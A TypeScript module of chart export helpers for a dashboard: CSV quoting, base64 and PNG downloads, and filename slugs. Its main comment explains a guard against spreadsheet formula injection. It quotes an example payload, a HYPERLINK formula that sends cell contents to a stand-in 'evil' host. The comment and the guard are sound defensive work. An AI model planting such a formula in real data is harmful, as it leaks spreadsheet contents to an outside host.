/** Client-side export helpers shared by every chart's actions menu. */

/**
 * RFC 4180 quoting, plus a formula-injection guard.
 *
 * Quoting: a field containing a quote, comma, or newline must be wrapped and
 * its quotes doubled — otherwise a device name like `LAPTOP, B CO` silently
 * becomes two columns in Excel.
 *
 * Formula injection: category and device names in this file come from CSV
 * IMPORT, i.e. from outside. A value beginning `=`, `+`, `-`, `@`, or a
 * leading tab/CR is interpreted by Excel and Sheets as a FORMULA when the
 * export is opened — so an imported category of
 * `=HYPERLINK("http://evil/"&A1,"click")` becomes a live link in an admin's
 * spreadsheet. Prefixing with an apostrophe forces the cell to text; Excel
 * shows the original characters and does not evaluate them. RFC quoting alone
 * does NOT prevent this.
 */
const FORMULA_LEAD = /^[=+\-@\t\r]/;
// A plain number is never a formula. Without this carve-out the `-` case would
// mangle any negative value into the text `'-5`.
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

function csvCell(value: unknown): string {
  const raw = value === null || value === undefined ? "" : String(value);
  const s = FORMULA_LEAD.test(raw) && !PLAIN_NUMBER.test(raw) ? `'${raw}` : raw;
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

export function toCsv(columns: string[], rows: Array<Record<string, unknown>>): string {
  const head = columns.map(csvCell).join(",");
  const body = rows.map((r) => columns.map((c) => csvCell(r[c])).join(","));
  return [head, ...body].join("\r\n");
}

function triggerDownload(blob: Blob, filename: string) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  // Revoking synchronously can cancel the download in some browsers; defer.
  setTimeout(() => URL.revokeObjectURL(url), 0);
}

export const XLSX_MIME = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";

/**
 * Download a file the SERVER built, handed over as base64.
 *
 * The dormant-device export is the only one that works this way, and only
 * because its rows carry a colour: CSV cannot express one, so that sheet is a
 * real .xlsx written by `stale-workbook.ts`. Everything else on this dashboard
 * still returns rows to `downloadCsv` below, which is the shared writer and
 * should stay the default — a format is worth its weight only where the format
 * itself carries meaning.
 *
 * `atob` gives one character per byte, so the values are already 0-255 and the
 * Uint8Array copy is exact; decoding through a string is fine at this size,
 * bounded by DEVICE_EXPORT_MAX.
 */
export function downloadBase64(filename: string, base64: string, mime: string) {
  const bin = atob(base64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  triggerDownload(new Blob([bytes], { type: mime }), filename);
}

export function downloadCsv(filename: string, columns: string[], rows: Array<Record<string, unknown>>) {
  // BOM so Excel reads UTF-8 rather than the local ANSI codepage.
  const blob = new Blob(["﻿" + toCsv(columns, rows)], { type: "text/csv;charset=utf-8;" });
  triggerDownload(blob, filename);
}

/**
 * Rasterize a chart node to PNG. html-to-image is imported dynamically so the
 * library only reaches the browser when someone actually exports — it is dead
 * weight on the initial dashboard payload otherwise.
 */
export async function downloadPng(node: HTMLElement, filename: string) {
  const { toPng } = await import("html-to-image");
  const dataUrl = await toPng(node, {
    // The chart surface is transparent over the ledger background; without an
    // explicit background the exported PNG has a see-through plot area.
    backgroundColor: "#fbfcf9",
    pixelRatio: 2,
  });
  const res = await fetch(dataUrl);
  triggerDownload(await res.blob(), filename);
}

/** Slug used for export filenames: `fleet-status-30d-all-units.csv`. */
export function exportName(base: string, parts: Array<string | null | undefined>, ext: string) {
  const slug = [base, ...parts.filter(Boolean)]
    .join("-")
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "");
  return `${slug}.${ext}`;
}
